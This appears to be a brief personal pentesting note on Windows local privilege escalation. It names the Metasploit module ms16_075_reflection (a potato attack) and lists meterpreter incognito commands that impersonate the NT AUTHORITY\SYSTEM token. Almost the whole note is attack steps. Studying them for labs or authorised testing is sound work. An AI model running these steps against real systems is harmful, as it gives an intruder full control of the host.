Use the MSF module: **windows/local/ms16_075_reflection**
This is a potato attack

When the exploit is finished in the meterpreter run the following commands:

Load incognito:
```msfconsole
load incognito
```

List available tokens:
```msfconsole
list_tokens -u
```

Impersonate user:
```msfconsole
impersonate_token "NT AUTHORITY\SYSTEM"
```

![[Pasted image 20240417091241.png]]